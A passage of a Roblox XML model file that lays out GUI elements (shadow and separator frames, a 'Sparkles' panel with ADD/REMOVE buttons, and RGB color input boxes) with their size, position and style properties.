													</max>
												</Rect2D>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">2</int>
											</Properties>
											<Item class="Frame" referent="RBX27D25B062E9A4FCCB33B363BFC55E7E2">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190080</Color3>
													<float name="BackgroundTransparency">0.75</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">Shadow</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBX4B87B673250145DEAF0C5C7B7479CDA1">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBXC89740BB8CEA44F782BF3092727E06ED">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>16</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBXE579F630C7254013B19BFBD29BE6A9C1">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>10</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX2E30C21BB5E74025A8AC4E24B8384328">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0.675000012</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Sparkles</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>90</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>25</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX2A0F68082F7D440492C5B0BC447F81AF">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>60</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Sparkles</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="ImageButton" referent="RBXE00317AE15FB4F4899D8A1FE229A41A2">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=134367382</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">ArrowButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX8A797F77645A416D97509C5716B66746">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278543871</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>3</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX7EB9E0C1EB1D4E109F118ABA9C837D7C">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">AddButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>1</XS>
											<XO>-40</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>19</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">ADD</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX0BA9D1EC94EE4B6E8164940ED1B007D8">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">RemoveButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>90</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>58</XO>
											<YS>0</YS>
											<YO>19</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">REMOVE</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXEAA3465E697C4FF886C3DEE57751D92B">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Shadow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXB5CC0B28F6DA44ADBCCB5BA34BA32509">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">true</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Options</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>3</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-3</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXDFE7E3C838AC4713B13B697037BFAD0B">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">ColorOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>10</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX9965A070508F4E7E9147940B996DCD53">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Color</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX60AA193B92074D4E8F2148475D8CB991">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">RInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>35</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX273220E399164B93B37D6F4C176E0578">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBXCB480A8F45B94925BD1A3040708D8400">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBXD916ED72B2944A6FB8EC78F064A76DBA">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294901760</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX12B12FB16B7741488B7E420702A4E545">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBX94511525B9BE4BEBBC89DD70D503D1F3">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">GInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>72</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX50ED5696668740BA9EDB26D2EC041CAA">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
